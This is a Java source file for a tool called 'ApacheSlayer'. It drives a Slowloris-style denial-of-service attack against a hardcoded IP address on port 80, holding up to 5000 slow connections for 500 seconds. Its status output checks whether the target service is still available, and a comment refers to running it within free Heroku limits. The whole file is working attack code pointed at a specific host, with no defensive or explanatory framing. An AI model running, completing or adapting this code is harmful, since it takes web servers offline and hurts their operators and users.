package dev.smolkin;

import dev.smolkin.task.PrintApplicationStatusTask;
import dev.smolkin.task.SlowConnectionTask;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

// -Xms512m -Xmx512m (Free Heroku limit)
public class ApacheSlayer {

    // ~ 1250 connections

    private static final String                HOST = "178.49.236.138";
    private static final int                   PORT = 80;
    private static final int                TIMEOUT = 7000; // milliseconds
    private static final int CONCURRENT_CONNECTIONS = 5000; // number of concurrent connections to hold on
    private static final int               DURATION = 500;  // seconds
    // headers interval
    // connections per second (rate)
    private static final Runtime            RUNTIME = Runtime.getRuntime();

    private static final ApplicationStatus APPLICATION_STATUS = ApplicationStatus.INSTANCE;

    // Active/Closed connections: 150/500
    // Average lifetime: 15.5 sec
    // Time: 00:01 / 00:25
    // Service available: FALSE
    // Memory usage: 512 mb

    public static void main(String[] args) {

        long startTime = System.nanoTime();
        long   endTime = startTime + DURATION * (long) 1e9;

        PrintApplicationStatusTask printApplicationStatusTask = new PrintApplicationStatusTask(HOST, PORT, TIMEOUT, startTime, DURATION);
        ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(1);
        scheduledExecutorService.scheduleAtFixedRate(printApplicationStatusTask, 0, 500, TimeUnit.MILLISECONDS);

//        Thread thread = new Thread(new SlowConnectionTask(HOST, PORT));
//        thread.start();

        ExecutorService executor = Executors.newCachedThreadPool();

        do {
            // connections per second rate (100 connections per second)
            for (int i = 0; i < 100; i++) {
                if (APPLICATION_STATUS.getActiveConnections() < CONCURRENT_CONNECTIONS) {
                    executor.execute(new SlowConnectionTask(HOST, PORT));
                }
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } while (System.nanoTime() < endTime);

        executor.shutdown();

        scheduledExecutorService.shutdown();
    }

    public static long getMemoryUsage() {
        return (RUNTIME.totalMemory() - RUNTIME.freeMemory()) / (int) 1e6;
    }

}
